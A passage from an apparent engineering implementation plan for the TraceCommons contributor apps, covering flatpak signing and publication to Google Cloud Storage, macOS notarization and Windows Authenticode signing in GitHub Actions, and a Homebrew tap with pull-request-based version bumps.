git add crates/trace-commons-contributor-gtk/flatpak/cargo-sources.json \
  crates/trace-commons-contributor-gtk/flatpak/ai.tracecommons.Contributor.yml \
  .github/workflows/release-apps.yml \
  crates/trace-commons-contributor/tests/release_pipeline.rs
git commit -m "Build the flatpak in CI for the first time"
git push
gh workflow run release-apps.yml --repo TraceCommons/trace-commons-server \
  --ref signed-app-distribution-spec -f platform=linux -f version=0.0.0
gh run watch --repo TraceCommons/trace-commons-server
```

Expected: unknown. This is discovery, not verification. Likely failure modes and what they mean:
- The rust-stable extension version does not match the SDK — adjust the `//24.08` branch to the one the GNOME 46 SDK actually carries.
- `cargo --offline` cannot find a crate — `cargo-sources.json` is stale against `Cargo.lock`; regenerate.
- The build succeeds but the binary is missing — the `install -Dm755` path in `build-commands` does not match where cargo put it under the flatpak build root.

Report what actually happened with output. If the manifest needs changes beyond the three above, stop and report rather than improvising a wider sandbox grant — widening `finish-args` to make a build pass would trade away the property the manifest exists to hold.

- [ ] **Step 8: Update the manifest header**

Once it builds, replace the `# UNBUILT.` paragraph with what is now true: the run id that built it, the runner, and the SDK versions. Leave the paragraph about custom `claude_root`/`codex_root` grants alone — that limitation is unchanged.

```bash
git add crates/trace-commons-contributor-gtk/flatpak/ai.tracecommons.Contributor.yml
git commit -m "Record that the flatpak manifest now builds"
```

---

### Task 9: Sign and publish the flatpak repo

**Files:**
- Create: `scripts/flatpak/build-and-sign.sh`, `scripts/flatpak/publish-repo.sh`
- Modify: `.github/workflows/release-apps.yml` (sign + publish steps in `linux-flatpak`)
- Test: `crates/trace-commons-contributor/tests/release_pipeline.rs`

**Interfaces:**
- Consumes: the `flatpak-repo` directory from Task 8.
- Produces: a GPG-signed OSTree repo and `ai.tracecommons.Contributor.flatpakref` at `https://storage.googleapis.com/<bucket>/repo`.

- [ ] **Step 1: Create the signing key and store it in Secret Manager**

```bash
gpg --batch --quick-generate-key \
  "Trace Commons Flatpak Signing <ops@tracecommons.ai>" rsa4096 sign never
KEYID="$(gpg --list-keys --with-colons ops@tracecommons.ai | awk -F: '/^fpr:/{print $10; exit}')"
echo "$KEYID"
gpg --export-secret-keys --armor "$KEYID" | \
  gcloud secrets create flatpak-signing-key --project tracecommons-pilot-2026 --data-file=-
gpg --export "$KEYID" > /tmp/flatpak-signing-pub.gpg
```

RSA-4096 rather than an elliptic curve, for compatibility with older `flatpak` clients' gpgme. Record `$KEYID`; it is a build input, not a secret.

- [ ] **Step 2: Create the public bucket**

```bash
gcloud storage buckets create gs://tracecommons-flatpak \
  --project tracecommons-pilot-2026 --location us --uniform-bucket-level-access
gcloud storage buckets add-iam-policy-binding gs://tracecommons-flatpak \
  --member=allUsers --role=roles/storage.objectViewer
```

If an org policy blocks public access, stop and report — the alternative is serving through the existing Cloudflare setup, which is a different design decision and belongs back with the user, not improvised here.

- [ ] **Step 3: Set up workload identity federation so no key reaches GitHub**

```bash
gcloud iam workload-identity-pools create github --project tracecommons-pilot-2026 \
  --location global --display-name "GitHub Actions"
gcloud iam workload-identity-pools providers create-oidc github \
  --project tracecommons-pilot-2026 --location global \
  --workload-identity-pool github \
  --issuer-uri https://token.actions.githubusercontent.com \
  --attribute-mapping "google.subject=assertion.sub,attribute.repository=assertion.repository" \
  --attribute-condition "assertion.repository=='TraceCommons/trace-commons-server'"
gcloud iam service-accounts create flatpak-publisher --project tracecommons-pilot-2026
```

Grant that service account `roles/secretmanager.secretAccessor` on `flatpak-signing-key` and `roles/storage.objectAdmin` on the bucket, then bind `roles/iam.workloadIdentityUser` for the pool's principal set. Store the provider resource name and service-account email as `GCP_WIF_PROVIDER` and `GCP_FLATPAK_PUBLISHER_SA` repository secrets.

- [ ] **Step 4: Write the failing test**

Append to `crates/trace-commons-contributor/tests/release_pipeline.rs`:

```rust
#[test]
fn flatpak_repo_is_gpg_signed_before_publication() {
    let script = read("scripts/flatpak/build-and-sign.sh");
    assert!(
        script.contains("build-sign") && script.contains("build-update-repo"),
        "both the commit and the repo summary must be signed; a signed commit \
         under an unsigned summary still lets a repo be rolled back or \
         truncated by whoever serves it"
    );
    assert!(
        script.contains("--gpg-sign"),
        "the OSTree repo must be signed with our key"
    );
    let publish = read("scripts/flatpak/publish-repo.sh");
    assert!(
        publish.contains("GPGKey="),
        "the .flatpakref must embed the public key, or the contributor's \
         first install has nothing to verify against"
    );
}
```

- [ ] **Step 5: Run the test to verify it fails**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: FAIL — neither script exists.

- [ ] **Step 6: Create `scripts/flatpak/build-and-sign.sh`**

```bash
#!/usr/bin/env bash
# Sign a built flatpak OSTree repo.
#
# Both the commit and the repo summary are signed. Signing only the commit
# would leave the summary -- the index a client reads to discover what
# versions exist -- unsigned, so whoever serves the repo could still roll a
# contributor back to an older build or hide an update.
set -euo pipefail

REPO="${1:?usage: build-and-sign.sh <repo-dir> <gpg-key-id>}"
KEYID="${2:?usage: build-and-sign.sh <repo-dir> <gpg-key-id>}"

flatpak build-sign "$REPO" --gpg-sign="$KEYID"
flatpak build-update-repo "$REPO" \
  --gpg-sign="$KEYID" \
  --generate-static-deltas \
  --prune

# Refuse to hand back an unsigned repo: `ostree show` must report a signature.
ostree --repo="$REPO" refs | grep '^app/' | while read -r ref; do
  if ! ostree --repo="$REPO" show "$ref" | grep -qi 'signature'; then
    echo "refusing to publish: $ref carries no signature" >&2
    exit 1
  fi
done

echo "PASS: signed $REPO with $KEYID"
```

- [ ] **Step 7: Create `scripts/flatpak/publish-repo.sh`**

```bash
#!/usr/bin/env bash
# Publish a signed OSTree repo plus its .flatpakref to GCS.
#
# The .flatpakref embeds the public key, so `flatpak install --from <url>`
# verifies against a key the contributor received with the ref rather than
# one fetched separately from the same host. That is a weaker property than
# out-of-band key distribution and worth being plain about: it protects
# against a compromised mirror, not against a compromised origin.
set -euo pipefail

REPO="${1:?usage: publish-repo.sh <repo-dir> <pubkey-file> <bucket>}"
PUBKEY="${2:?usage: publish-repo.sh <repo-dir> <pubkey-file> <bucket>}"
BUCKET="${3:?usage: publish-repo.sh <repo-dir> <pubkey-file> <bucket>}"

BASE="https://storage.googleapis.com/$BUCKET"

cat > ai.tracecommons.Contributor.flatpakref <<REF
[Flatpak Ref]
Title=Trace Commons
Name=ai.tracecommons.Contributor
Branch=master
Url=$BASE/repo
IsRuntime=false
GPGKey=$(base64 < "$PUBKEY" | tr -d '\n')
RuntimeRepo=https://dl.flathub.org/repo/flathub.flatpakrepo
REF

gcloud storage rsync --recursive --delete-unmatched-destination-objects \
  "$REPO" "gs://$BUCKET/repo"
gcloud storage cp ai.tracecommons.Contributor.flatpakref "gs://$BUCKET/"
gcloud storage cp "$PUBKEY" "gs://$BUCKET/tracecommons-flatpak.gpg"

echo "PASS: published to $BASE"
echo "install with: flatpak install --from $BASE/ai.tracecommons.Contributor.flatpakref"
```

- [ ] **Step 8: Wire both into the `linux-flatpak` job**

After the "Confirm the app is actually in the repo" step, insert:

```yaml
      - uses: google-github-actions/auth@7c6bc770dae815cd3e89ee6cdf493a5fab2cc093 # v3
        with:
          workload_identity_provider: ${{ secrets.GCP_WIF_PROVIDER }}
          service_account: ${{ secrets.GCP_FLATPAK_PUBLISHER_SA }}
      - uses: google-github-actions/setup-gcloud@aa5489c8933f4cc7a4f7d45035b3b1440c9c10db # v3.0.1

      - name: Import the signing key from Secret Manager
        run: |
          set -euo pipefail
          gcloud secrets versions access latest --secret=flatpak-signing-key \
            --project tracecommons-pilot-2026 | gpg --batch --import
          KEYID="$(gpg --list-keys --with-colons ops@tracecommons.ai \
            | awk -F: '/^fpr:/{print $10; exit}')"
          echo "GPG_KEYID=$KEYID" >> "$GITHUB_ENV"
          gpg --export "$KEYID" > flatpak-signing-pub.gpg

      - name: Sign the repo
        run: ./scripts/flatpak/build-and-sign.sh flatpak-repo "$GPG_KEYID"

      # Only a tag publishes. A dispatch run proves the build and signature
      # without moving what contributors' clients would pull.
      - name: Publish
        if: github.event_name == 'push'
        run: |
          ./scripts/flatpak/publish-repo.sh \
            flatpak-repo flatpak-signing-pub.gpg tracecommons-flatpak
```

Mark both scripts executable: `chmod +x scripts/flatpak/*.sh`

- [ ] **Step 9: Run the tests, lint, commit, and dispatch**

```bash
cargo test -p trace-commons-contributor --test release_pipeline
actionlint .github/workflows/release-apps.yml
shellcheck scripts/flatpak/build-and-sign.sh scripts/flatpak/publish-repo.sh
git add scripts/flatpak .github/workflows/release-apps.yml \
  crates/trace-commons-contributor/tests/release_pipeline.rs
git commit -m "Sign and publish the flatpak repo"
git push
gh workflow run release-apps.yml --repo TraceCommons/trace-commons-server \
  --ref signed-app-distribution-spec -f platform=linux -f version=0.0.0
gh run watch --repo TraceCommons/trace-commons-server
```

Expected: green through the signing step, with `PASS: signed flatpak-repo` in the log. Publication is skipped on a dispatch run — confirm from the log that it was skipped rather than assuming.

- [ ] **Step 10: The clean-container gate**

After a tagged run has published, on a Linux machine or container with flatpak and **no** prior TraceCommons remote:

```bash
flatpak install --from \
  https://storage.googleapis.com/tracecommons-flatpak/ai.tracecommons.Contributor.flatpakref
flatpak run ai.tracecommons.Contributor --help
```

Expected: flatpak prompts to trust the embedded key, installs, and the binary runs. Confirm GPG verification was **not** disabled — no `--no-gpg-verify` anywhere. Paste the output; append it to `docs/release-runbook.md` and commit.

---

### Task 10: Sign the CLI and correct its release notes

`release-contributor.yml` ships unsigned binaries and tells contributors so, including "signing needs an Apple Developer identity and is not set up yet." Once signing exists that text is wrong in a way that keeps teaching people to click past Gatekeeper.

**Files:**
- Modify: `.github/workflows/release-contributor.yml`
- Test: `crates/trace-commons-contributor/tests/release_pipeline.rs`

**Interfaces:**
- Consumes: Task 3's macOS secrets; Task 6's Azure secrets and the `release` environment.
- Produces: signed and notarized macOS CLI zips, signed Windows CLI zip, unsigned Linux binary with checksum.

- [ ] **Step 1: Write the failing test**

Append to `crates/trace-commons-contributor/tests/release_pipeline.rs`:

```rust
#[test]
fn contributor_release_notes_do_not_teach_past_gatekeeper() {
    let workflow = read(".github/workflows/release-contributor.yml");
    for stale in [
        "not code-signed or notarized",
        "Signing needs an Apple Developer identity and is not set up yet",
    ] {
        assert!(
            !workflow.contains(stale),
            "the release notes still say {stale:?}, which trains \
             contributors past the warning that should stop a tampered build"
        );
    }
    assert!(
        workflow.contains("notarytool"),
        "the macOS CLI binaries must be notarized"
    );
    // notarytool accepts a disk image, a package, or a zip -- never a bare
    // Mach-O. The zip is what gets submitted.
    assert!(
        workflow.contains("ditto") || workflow.contains("zip"),
        "a bare binary cannot be submitted for notarization; zip it first"
    );
    assert!(
        workflow.contains("x86_64-pc-windows-msvc"),
        "Windows must be in the release matrix"
    );
}
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: FAIL on the stale-copy assertions and on the Windows target.

- [ ] **Step 3: Add Windows to the matrix**

In the `build` job's `matrix.include`, add:

```yaml
          - os: windows-latest
            target: x86_64-pc-windows-msvc
```

- [ ] **Step 4: Sign and notarize the macOS binaries**

After the `Package` step, add:

```yaml
      # notarytool takes a disk image, a package, or a zip -- never a bare
      # Mach-O. So the binary is signed, zipped, and the ZIP submitted. There
      # is nothing to staple (stapling needs a bundle, package, or image),
      # which is fine for a shell-invoked binary: Gatekeeper resolves the
      # ticket online, and a CLI is not subject to the quarantine-launch path
      # a .app is.
      - name: Sign and notarize (macOS)
        if: runner.os == 'macOS'
        env:
          MACOS_CERTIFICATE_P12_BASE64: ${{ secrets.MACOS_CERTIFICATE_P12_BASE64 }}
          MACOS_CERTIFICATE_PASSWORD: ${{ secrets.MACOS_CERTIFICATE_PASSWORD }}
          MACOS_SIGNING_IDENTITY: ${{ secrets.MACOS_SIGNING_IDENTITY }}
          MACOS_NOTARY_ASC_KEY_P8_BASE64: ${{ secrets.MACOS_NOTARY_ASC_KEY_P8_BASE64 }}
          MACOS_NOTARY_ASC_KEY_ID: ${{ secrets.MACOS_NOTARY_ASC_KEY_ID }}
          MACOS_NOTARY_ASC_ISSUER_ID: ${{ secrets.MACOS_NOTARY_ASC_ISSUER_ID }}
        run: |
          set -euo pipefail
          OUT=trace-commons-contributor-${{ matrix.target }}
          KEYCHAIN="$RUNNER_TEMP/tc-cli.keychain-db"
          KEYCHAIN_PASSWORD="$(uuidgen)"
          security create-keychain -p "$KEYCHAIN_PASSWORD" "$KEYCHAIN"
          security set-keychain-settings -lut 900 "$KEYCHAIN"
          security unlock-keychain -p "$KEYCHAIN_PASSWORD" "$KEYCHAIN"
          echo "$MACOS_CERTIFICATE_P12_BASE64" | base64 --decode > "$RUNNER_TEMP/cert.p12"
          security import "$RUNNER_TEMP/cert.p12" -k "$KEYCHAIN" \
            -P "$MACOS_CERTIFICATE_PASSWORD" -T /usr/bin/codesign
          security set-key-partition-list -S apple-tool:,apple:,codesign: \
            -s -k "$KEYCHAIN_PASSWORD" "$KEYCHAIN" >/dev/null
          ORIGINAL="$(security list-keychains -d user | sed -e 's/^[[:space:]]*"//' -e 's/"$//')"
          # shellcheck disable=SC2086
          security list-keychains -d user -s "$KEYCHAIN" $ORIGINAL

          codesign --force --timestamp --options runtime \
            --sign "$MACOS_SIGNING_IDENTITY" "dist/$OUT"
          codesign --verify --strict --verbose=2 "dist/$OUT"

          ditto -c -k --keepParent "dist/$OUT" "$RUNNER_TEMP/$OUT.zip"
          echo "$MACOS_NOTARY_ASC_KEY_P8_BASE64" | base64 --decode > "$RUNNER_TEMP/notary.p8"
          chmod 600 "$RUNNER_TEMP/notary.p8"
          xcrun notarytool submit "$RUNNER_TEMP/$OUT.zip" \
            --key "$RUNNER_TEMP/notary.p8" \
            --key-id "$MACOS_NOTARY_ASC_KEY_ID" \
            --issuer "$MACOS_NOTARY_ASC_ISSUER_ID" \
            --wait
          cp "$RUNNER_TEMP/$OUT.zip" "dist/$OUT.zip"
          # The Package step checksummed the UNSIGNED binary. codesign
          # rewrote those bytes, so both checksums are recomputed here --
          # otherwise every contributor who verifies the download sees a
          # mismatch and correctly concludes something is wrong.
          ( cd dist && shasum -a 256 "$OUT" > "$OUT.sha256" )
          ( cd dist && shasum -a 256 "$OUT.zip" > "$OUT.zip.sha256" )

          rm -f "$RUNNER_TEMP/notary.p8" "$RUNNER_TEMP/cert.p12"
          security delete-keychain "$KEYCHAIN"
          # shellcheck disable=SC2086
          security list-keychains -d user -s $ORIGINAL
```

Add `environment: release` to the `build` job (the federated credential's subject is `repo:...:environment:release`; without it the OIDC token will not match and signing fails at auth), then add the Windows signing steps:

```yaml
      - uses: azure/login@a457da9ea143d694b1b9c7c869ebb04ebe844ef5 # v2
        if: runner.os == 'Windows'
        with:
          client-id: ${{ vars.AZURE_SIGNING_CLIENT_ID }}
          tenant-id: ${{ vars.AZURE_SIGNING_TENANT_ID }}
          subscription-id: ${{ vars.AZURE_SIGNING_SUBSCRIPTION_ID }}

      # The same SHA-verified dlib setup as release-apps.yml's windows job,
      # repeated rather than factored into a composite action: a composite
      # action is one more dependency running inside a job that holds signing
      # authority, and minimising exactly that is the point of the hash check.
      # If this changes it must change in BOTH workflows -- the test pins the
      # hash constant in each.
      #
      # No signing key reaches this runner. Trusted Signing issues a
      # short-lived certificate against the OIDC token above, and the dlib
      # authenticates through DefaultAzureCredential picking up that session.
      - name: Set up Trusted Signing (SHA-verified dlib + signtool)
        id: ts
        if: runner.os == 'Windows'
        shell: pwsh
        env:
          TS_ENDPOINT: ${{ vars.AZURE_SIGNING_ENDPOINT }}
          TS_ACCOUNT: ${{ vars.AZURE_SIGNING_ACCOUNT }}
          TS_PROFILE: ${{ vars.AZURE_SIGNING_PROFILE }}
          # Independently verified 2026-08-16 by downloading and hashing the
          # package. On a version bump, re-derive this from a trusted machine.
          TRUSTED_SIGNING_CLIENT_SHA256: 3BFCF1E0A3CB42AF1692F0A8ED45C15DE070C2DE86F28A59B2795D904D8A920F
        run: |
          $ErrorActionPreference = "Stop"
          $nugetVersion = "1.0.95"
          $pkgZip = Join-Path $env:RUNNER_TEMP "mtsc.zip"
          $pkgDir = Join-Path $env:RUNNER_TEMP "mtsc"
          Invoke-WebRequest -UseBasicParsing `
            -Uri "https://www.nuget.org/api/v2/package/Microsoft.Trusted.Signing.Client/$nugetVersion" `
            -OutFile $pkgZip

          $expected = $env:TRUSTED_SIGNING_CLIENT_SHA256
          $actual = (Get-FileHash -Path $pkgZip -Algorithm SHA256).Hash
          Write-Host "Microsoft.Trusted.Signing.Client $nugetVersion SHA-256: $actual"
          if ([string]::IsNullOrWhiteSpace($expected)) {
            throw "TRUSTED_SIGNING_CLIENT_SHA256 is not set (observed: $actual). Refusing to extract an unverified signing package."
          }
          if ($actual -ne $expected.Trim().ToUpperInvariant()) {
            throw "Hash mismatch for Microsoft.Trusted.Signing.Client $nugetVersion. Expected $($expected.Trim().ToUpperInvariant()), got $actual. Refusing to expand a potentially tampered signing package."
          }

          Expand-Archive -Path $pkgZip -DestinationPath $pkgDir -Force
          $dlib = Join-Path $pkgDir "bin\x64\Azure.CodeSigning.Dlib.dll"
          if (-not (Test-Path $dlib)) {
            $dlib = (Get-ChildItem -Path $pkgDir -Recurse -Filter "Azure.CodeSigning.Dlib.dll" |
                     Select-Object -First 1 -ExpandProperty FullName)
          }
          if (-not $dlib) { throw "Azure.CodeSigning.Dlib.dll not found in package" }

          $metadata = Join-Path $env:RUNNER_TEMP "ts-metadata.json"
          [ordered]@{
            Endpoint               = $env:TS_ENDPOINT
            CodeSigningAccountName = $env:TS_ACCOUNT
            CertificateProfileName = $env:TS_PROFILE
          } | ConvertTo-Json | Out-File -FilePath $metadata -Encoding utf8

          # -ErrorAction SilentlyContinue so the friendly throw below is
          # actually reachable: under $ErrorActionPreference = "Stop", a missing
          # Windows Kits directory (image change, SDK relocation) raises a
          # terminating ItemNotFoundException here and the operator sees a path
          # error instead of the message written for them.
          #
          # Sorted as a [version], not as a string: a lexicographic sort over
          # SDK directory names happens to pick correctly today but breaks the
          # moment a 10.0.9xxxx-style entry appears beside a 10.0.2xxxx one.
          $signtool = (Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\bin\*\x64\signtool.exe" `
                         -ErrorAction SilentlyContinue |
                       Sort-Object { [version]$_.Directory.Parent.Name } -Descending |
                       Select-Object -First 1 -ExpandProperty FullName)
          if (-not $signtool) { throw "signtool.exe not found in Windows SDK" }

          "dlib=$dlib"         >> $env:GITHUB_OUTPUT
          "metadata=$metadata" >> $env:GITHUB_OUTPUT
          "signtool=$signtool" >> $env:GITHUB_OUTPUT

      # /tr with /td is the RFC3161 countersignature, and it is mandatory:
      # Trusted Signing certificates carry roughly three-day validity, so the
      # timestamp is the only reason a signature outlives them.
      - name: Sign, verify and re-checksum (Windows)
        if: runner.os == 'Windows'
        shell: pwsh
        run: |
          $ErrorActionPreference = "Stop"
          Get-ChildItem dist\*.exe | ForEach-Object {
            & "${{ steps.ts.outputs.signtool }}" sign /v /fd SHA256 `
              /tr http://timestamp.acs.microsoft.com /td SHA256 `
              /dlib "${{ steps.ts.outputs.dlib }}" `
              /dmdf "${{ steps.ts.outputs.metadata }}" `
              $_.FullName
            if ($LASTEXITCODE -ne 0) { throw "signing failed for $($_.Name)" }

            # The real check: what a verifier says, not what signing reported.
            & "${{ steps.ts.outputs.signtool }}" verify /pa /v $_.FullName
            if ($LASTEXITCODE -ne 0) { throw "signature verification failed for $($_.Name)" }

            # The checksum from the Package step covers the UNSIGNED binary.
            # Signing rewrote those bytes, so it must be recomputed or every
            # contributor who checks it will see a mismatch.
            (Get-FileHash $_.FullName -Algorithm SHA256).Hash |
              Out-File "$($_.FullName).sha256" -Encoding ascii
          }

      # After signing, so the provenance covers the signed bytes.
      - uses: actions/attest-build-provenance@a2bbfa25375fe432b6a289bc6b6cd05ecd0c4c32 # v4
        with:
          subject-path: dist/*
```

- [ ] **Step 5: Rewrite the release notes**

Replace the `--notes` body with:

```
          gh release create "${GITHUB_REF_NAME}" \
            --repo "${GITHUB_REPOSITORY}" \
            --title "${GITHUB_REF_NAME}" \
            --notes "Contributor CLI binaries.

          The macOS binaries are signed with Iqlusion Inc's Developer ID and
          notarized by Apple; the Windows binaries are Authenticode-signed and
          timestamped. Verify any download against the published \`.sha256\`
          beside it -- that checks integrity, while the signature is what
          establishes who built it.

          The Linux binary is not signed. Use the checksum, or install the
          flatpak, whose OSTree repo is GPG-signed:
          https://storage.googleapis.com/tracecommons-flatpak/ai.tracecommons.Contributor.flatpakref

          Nothing leaves your machine until you run \`submit\`. Run
          \`submit --dry-run\` first to see exactly what would be sent." \
            dist/*/*
```

- [ ] **Step 6: Run the tests, lint, commit**

```bash
cargo test -p trace-commons-contributor --test release_pipeline
actionlint .github/workflows/release-contributor.yml
git add .github/workflows/release-contributor.yml \
  crates/trace-commons-contributor/tests/release_pipeline.rs
git commit -m "Sign the contributor CLI and correct its release notes"
git push
```

- [ ] **Step 7: Dispatch and verify**

```bash
gh workflow run release-contributor.yml --repo TraceCommons/trace-commons-server \
  --ref signed-app-distribution-spec
gh run watch --repo TraceCommons/trace-commons-server
```

Expected: green with `Accepted` from notarytool and `Successfully verified` from signtool. Download the macOS zip on another Mac and run `spctl --assess --type execute --verbose=2` against the extracted binary; paste the result.

---

### Task 11: The Homebrew tap

**Files:**
- Create (new repo `TraceCommons/homebrew-tap`): `Casks/trace-commons.rb`, `Formula/trace-commons-contributor.rb`, `README.md`
- Test: `crates/trace-commons-contributor/tests/release_pipeline.rs` (the zap exclusion is a property of this repo's data, so it is pinned here)

**Interfaces:**
- Consumes: the DMG and CLI zip URLs from the GitHub Releases produced by Tasks 5 and 10.
- Produces: `brew tap TraceCommons/tap && brew install --cask trace-commons`.

- [ ] **Step 1: Write the failing test**

Append to `crates/trace-commons-contributor/tests/release_pipeline.rs`:

```rust
/// The cask lives in another repository, so this test pins the requirement
/// rather than the file: the runbook must state the exclusion, and the
/// reason, so nobody "tidies up" a zap stanza that looks incomplete.
#[test]
fn runbook_states_why_zap_spares_the_device_key() {
    let runbook = read("docs/release-runbook.md");
    assert!(
        runbook.contains("contributor.json"),
        "the runbook must name the file the cask's zap stanza spares"
    );
    assert!(
        runbook.contains("not idempotent"),
        "the runbook must say WHY: /v1/onboard is not idempotent, so deleting \
         the device key burns an invite code that cannot be reissued"
    );
}
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: FAIL — the runbook does not mention `contributor.json`.

- [ ] **Step 3: Create the tap repository**

```bash
gh repo create TraceCommons/homebrew-tap --public \
  --description "Homebrew tap for Trace Commons" --clone
cd homebrew-tap && mkdir -p Casks Formula
```

- [ ] **Step 4: Write `Casks/trace-commons.rb`**

Substitute the real version and the `shasum` output from the published DMG.

```ruby
cask "trace-commons" do
  version "0.2.0"
  sha256 "REPLACE_WITH_PUBLISHED_DMG_SHA256"

  url "https://github.com/TraceCommons/trace-commons-server/releases/download/app-v#{version}/TraceCommons-#{version}.dmg"
  name "Trace Commons"
  desc "Contributes your coding session traces to the Trace Commons corpus"
  homepage "https://tracecommons.ai/"

  depends_on macos: ">= :sonoma"

  app "TraceCommons.app"

  # The app registers itself as a login item through SMAppService. Deleting a
  # running bundle strands an entry in System Settings > General > Login
  # Items, which is exactly where a contributor goes to audit background
  # software -- so it must exit first.
  uninstall quit: "ai.tracecommons.shell"

  zap trash: [
    "~/Library/Caches/ai.tracecommons.shell",
    "~/Library/HTTPStorages/ai.tracecommons.shell",
    "~/Library/Preferences/ai.tracecommons.shell.plist",
  ]

  # DELIBERATELY NOT ZAPPED:
  # ~/Library/Application Support/trace-commons/contributor.json
  #
  # That file is the device identity key, and the server's /v1/onboard is not
  # idempotent -- an invite code cannot be redeemed twice. Trashing it would
  # mean `brew uninstall --zap` permanently locks a contributor out of
  # re-enrolling with a code nobody can reissue. This omission is intentional;
  # please do not "complete" the zap stanza.
end
```

- [ ] **Step 5: Write `Formula/trace-commons-contributor.rb`**

```ruby
class TraceCommonsContributor < Formula
  desc "CLI for contributing coding session traces to the Trace Commons corpus"
  homepage "https://tracecommons.ai/"
  version "0.1.0"
  license "Apache-2.0"

  on_macos do
    on_arm do
      url "https://github.com/TraceCommons/trace-commons-server/releases/download/contributor-v#{version}/trace-commons-contributor-aarch64-apple-darwin.zip"
      sha256 "REPLACE_WITH_PUBLISHED_ARM64_ZIP_SHA256"
    end
    on_intel do
      url "https://github.com/TraceCommons/trace-commons-server/releases/download/contributor-v#{version}/trace-commons-contributor-x86_64-apple-darwin.zip"
      sha256 "REPLACE_WITH_PUBLISHED_X86_64_ZIP_SHA256"
    end
  end

  def install
    bin.install Dir["trace-commons-contributor*"].first => "trace-commons-contributor"
  end

  test do
    assert_match "trace-commons-contributor", shell_output("#{bin}/trace-commons-contributor --help")
  end
end
```

- [ ] **Step 6: Record the exclusion in the runbook**

Add a "Homebrew" section to `docs/release-runbook.md` stating the tap name, that the cask's `zap` deliberately spares `~/Library/Application Support/trace-commons/contributor.json`, and that the reason is `/v1/onboard` being **not idempotent** so the invite code cannot be reissued.

- [ ] **Step 7: Run the test to verify it passes**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: PASS.

- [ ] **Step 8: The clean-machine install gate**

On a Mac with no prior TraceCommons install:

```bash
brew tap TraceCommons/tap
brew install --cask trace-commons
ls -la /Applications/TraceCommons.app
brew uninstall --zap --cask trace-commons
ls -la ~/Library/Application\ Support/trace-commons/contributor.json
```

Expected: installs with no Gatekeeper prompt, and **`contributor.json` still exists after the zap.** That last line is the whole point of the exclusion; if the file is gone, the cask is wrong and must not ship. Paste all four outputs.

- [ ] **Step 9: Commit both repositories**

```bash
cd homebrew-tap && git add . && git commit -m "Add the trace-commons cask and CLI formula" && git push
cd - && git add docs/release-runbook.md && \
  git commit -m "Record the Homebrew tap and the deliberate zap exclusion" && git push
```

---

### Task 12: Automate the version bumps

**Files:**
- Modify: `.github/workflows/release-apps.yml` (add a `publish` job and a tap-bump step)
- Modify: `.github/workflows/release-contributor.yml` (tap-bump step for the formula)
- Test: `crates/trace-commons-contributor/tests/release_pipeline.rs`

**Interfaces:**
- Consumes: artifacts `macos-dmg`, `windows-zip` from Tasks 5 and 7.
- Produces: one GitHub Release per `app-v*` tag, and a pull request against `TraceCommons/homebrew-tap`.

- [ ] **Step 1: Write the failing test**

```rust
#[test]
fn tap_bumps_go_through_a_pull_request() {
    for file in [
        ".github/workflows/release-apps.yml",
        ".github/workflows/release-contributor.yml",
    ] {
        let workflow = read(file);
        assert!(
            workflow.contains("homebrew-tap"),
            "{file} must bump the tap"
        );
        // A direct push would auto-publish a bad release to everyone who has
        // tapped us, with no gate between a failed verification and a user's
        // `brew upgrade`.
        assert!(
            workflow.contains("gh pr create"),
            "{file} must open a pull request against the tap, not push to it"
        );
    }
}
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: FAIL on both files.

- [ ] **Step 3: Add the `publish` job to `release-apps.yml`**

```yaml
  publish:
    name: publish release
    needs: [version, macos, windows, linux-flatpak]
    # Publish whatever succeeded. The jobs are independent precisely so a
    # Linux failure does not withhold a verified macOS DMG.
    if: ${{ always() && github.event_name == 'push' }}
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          path: dist
          pattern: "{macos-dmg,windows-zip}"

      - name: Publish
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          gh release create "${GITHUB_REF_NAME}" \
            --repo "${GITHUB_REPOSITORY}" \
            --title "${GITHUB_REF_NAME}" \
            --notes "Trace Commons contributor apps.

          macOS: signed with Iqlusion Inc's Developer ID and notarized by
          Apple. Windows: Authenticode-signed via Azure Trusted Signing and
          RFC3161 timestamped. Linux: install the GPG-signed flatpak with
          \`flatpak install --from https://storage.googleapis.com/tracecommons-flatpak/ai.tracecommons.Contributor.flatpakref\`

          On macOS you can also \`brew tap TraceCommons/tap && brew install --cask trace-commons\`.

          Nothing leaves your machine until you approve an upload." \
            dist/*/*

      - name: Open a cask bump
        env:
          GH_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}
        run: |
          set -euo pipefail
          V="${{ needs.version.outputs.short }}"
          SHA="$(awk '{print $1}' dist/macos-dmg/TraceCommons-"$V".dmg.sha256)"
          gh repo clone TraceCommons/homebrew-tap tap -- --depth 1
          cd tap
          git switch -c "bump-cask-$V"
          sed -i "s/^  version \".*\"/  version \"$V\"/" Casks/trace-commons.rb
          sed -i "s/^  sha256 \".*\"/  sha256 \"$SHA\"/" Casks/trace-commons.rb
          git config user.name "trace-commons-release"
          git config user.email "ops@tracecommons.ai"
          git commit -am "trace-commons $V"
          git push -u origin "bump-cask-$V"
          gh pr create --fill --repo TraceCommons/homebrew-tap
```

`HOMEBREW_TAP_TOKEN` is a fine-grained PAT scoped to `TraceCommons/homebrew-tap` with contents and pull-request write. Note in the runbook that `github.token` cannot reach another repository.

- [ ] **Step 4: Add the formula bump to `release-contributor.yml`**

Append to that workflow's `publish` job:

```yaml
      - name: Open a formula bump
        env:
          GH_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}
        run: |
          set -euo pipefail
          V="${GITHUB_REF_NAME#contributor-v}"
          ARM="$(awk '{print $1}' dist/aarch64-apple-darwin/trace-commons-contributor-aarch64-apple-darwin.zip.sha256)"
          X86="$(awk '{print $1}' dist/x86_64-apple-darwin/trace-commons-contributor-x86_64-apple-darwin.zip.sha256)"
          gh repo clone TraceCommons/homebrew-tap tap -- --depth 1
          cd tap
          git switch -c "bump-formula-$V"
          sed -i "s/^  version \".*\"/  version \"$V\"/" Formula/trace-commons-contributor.rb
